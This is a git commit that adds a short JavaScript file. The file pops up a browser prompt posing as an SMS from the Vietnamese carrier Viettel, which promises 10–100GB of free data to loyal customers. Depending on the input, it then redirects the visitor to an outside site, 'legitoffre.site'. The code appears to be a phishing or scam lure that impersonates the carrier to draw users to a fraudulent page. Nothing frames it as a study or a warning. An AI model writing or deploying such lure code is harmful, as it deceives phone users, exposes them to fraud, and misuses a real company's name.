ec36828410c4e6ae3eb87160409fece17506df99
legitipz <gloliousam4@gmail.com>
2025-12-22 23:29:28 -0800

    Create activation-viettelfreedata.js

---
+++ activation-viettelfreedata.js
@@ -0,0 +1,5 @@
+var password = 'DỮ LIỆU MIỄN PHÍ'
+password=prompt('VIETTEL SMS: Kính gửi Quý Khách, Vui lòng kiểm tra xem SIM Viettel của bạn có đủ điều kiện nhận từ 10GB đến 100GB dữ liệu, phần thưởng cho khách hàng cũ, nhấn Dữ Liệu Miễn Phí để kiểm tra ngay ','DỮ LIỆU MIỄN PHÍ');
+if (password != 'DỮ LIỆU MIỄN PHÍ') {
+location.href='https://legitoffre.site/viettelfreedata.html';
+}
